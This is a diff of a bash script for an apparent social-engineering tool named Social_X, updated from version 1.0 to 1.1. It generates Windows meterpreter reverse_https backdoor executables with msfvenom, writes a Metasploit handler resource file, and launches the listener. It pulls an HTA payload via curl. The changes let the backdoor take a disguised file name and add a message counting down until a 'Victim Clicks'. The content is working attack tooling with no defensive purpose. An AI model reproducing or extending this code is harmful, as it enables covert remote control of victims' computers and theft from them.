@@ -10,7 +10,7 @@ function banner(){
     figlet Social_X -f banner/larry3d.flf 
     echo ${green} ------------------------------------------------------------------
     echo -e "                         By:Aziz Kaplan" 
-    echo -e "                          Version:1.0" 
+    echo -e "                          Version:1.1" 
     echo ${green} ------------------------------------------------------------------
 }
 
@@ -108,7 +108,8 @@ function binder() {
                 
                 echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
                 chmod 755 socialx_backdoor.sh
-                xterm -hold -e ./socialx_backdoor.sh &
+                echo -e "${green}[+]${lightblue}Connection Will Be Established After 3 Minutes Victim Clicks."
+		 xterm -hold -e ./socialx_backdoor.sh &
                 sleep 25
                 curl http://$private_ip:8080/socialx/socialx.hta -o $exe_file
                 clear
@@ -128,14 +129,14 @@ function binder() {
                 
 
                 if [[ $ip = "" ]];then
-                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > SOCIALX_BACKDOOR/socialx_backdoor.exe
+                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > SOCIALX_BACKDOOR/$exe_file
                     echo use exploit/multi/handler > Metasploit/socialx.rc
                     echo set LHOST $private_ip >> Metasploit/socialx.rc
                     echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                     echo set LPORT $port >> Metasploit/socialx.rc
                     echo exploit -j -z >> Metasploit/socialx.rc
                 else
-                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > SOCIALX_BACKDOOR/socialx_backdoor.exe
+                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > SOCIALX_BACKDOOR/$exe_file
                     echo use exploit/multi/handler > Metasploit/socialx.rc
                     echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                     echo set LHOST $ip >> Metasploit/socialx.rc
@@ -146,6 +147,7 @@ function binder() {
                 
                 echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
                 chmod 755 socialx_backdoor.sh
+		echo "${green}[+]${lightblue}Connection Will Be Established After 3 Minutes Victim Clicks."
                 xterm -hold -e ./socialx_backdoor.sh &
                 clear
                 banner
